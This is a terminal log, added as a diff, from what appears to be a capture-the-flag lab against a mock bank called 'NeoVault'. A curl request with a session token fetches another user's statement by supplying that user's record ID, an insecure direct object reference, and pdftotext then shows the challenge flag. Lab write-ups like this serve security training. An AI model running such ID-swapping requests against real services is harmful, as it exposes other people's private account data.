@@ -1,0 +1,63 @@
+(white㉿white)-[~]
+└─$ curl -s -X POST http://154.57.164.75:31306/api/v1/transactions/download-transactions \
+  -H "Content-Type: application/json" \
+  -H "Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjZhYTZhNjc0MDQ3M2Q3MjI2MWJiZjk0ZiIsImlhdCI6MTc4OTMwNjY0NCwiZXhwIjoxNzg5MzEwMjQ0fQ.PJ4x8YF4_TD0ZG3QpJXoF5MjX43cRsiHh-lckE6JAj8" \                
+  -d '{"_id": "6aa6a5270473d72261bbf922"}' \
+  -o statement.pdf
+                                                                                                                                                                      
+┌──(white㉿white)-[~]
+└─$ pdftotext statement.pdf -                                                             
+NeoVault BANK STATEMENT
+Statement Date: September 13, 2026
+
+Account Holder Information
+Username: user_with_flag
+
+Date
+
+From
+
+To
+
+Description
+
+Amount
+
+9/13/2026
+
+raj123
+
+user_with_flag
+
+food
+
+9/6/2026
+
+user_with_flag
+
+user_with_flag
+
+HTB{n0t_s0_3asy_1d0r}
+
+1337.00
+
+9/6/2026
+
+neo_system
+
+user_with_flag
+
+Welcome bonus credit
+
+1337.00
+
+1.00
+
+Transaction
+Summary
+Total Credits:
+$0.00
+Total Debits:
+$2675.00
+
+
